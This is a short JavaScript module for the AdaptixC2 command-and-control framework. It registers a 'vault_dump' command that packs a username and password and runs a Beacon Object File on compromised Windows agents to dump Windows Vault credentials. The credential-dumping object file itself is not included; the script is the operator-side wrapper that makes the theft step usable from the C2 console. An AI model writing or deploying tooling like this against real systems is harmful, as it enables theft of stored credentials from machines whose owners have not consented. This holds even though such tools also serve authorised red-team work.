var metadata = {
    name: "VaultAuditor",
    description: "BOF to audit and dump Windows Vaults for AdaptixC2"
};

let cmd_vault = ax.create_command("vault_dump", "Dumps vaults or targets a user", "vault_dump [ <user> <password> ]");

cmd_vault.addArgString("user", false, "Target username", "");
cmd_vault.addArgString("password", false, "Password", "");

cmd_vault.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let arch = ax.arch(id); 
    // Adjusting path to match your directory structure if needed
    let bof_path = ax.script_dir() + "vault_dump." + arch + ".o";
    
    if (!ax.file_exists(bof_path)) {
        ax.log("Error: BOF not found at " + bof_path);
        return false;
    }

    let user = parsed_json["user"] || "";
    let cred = parsed_json["password"] || "";

    // Adaptix specific: "cstr,cstr" with an array
    let bof_params = ax.bof_pack("cstr,cstr", [user, cred]);

    // Note: Adaptix execute bof does NOT require the entrypoint 'go' explicitly 
    // in the same way if the default is 'go', but following your example:
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Running VaultAuditor BOF");
});

var group = ax.create_commands_group("VaultAuditor", [cmd_vault]);
ax.register_commands_group(group, ["beacon", "gopher", "kharon"], ["windows"], []);
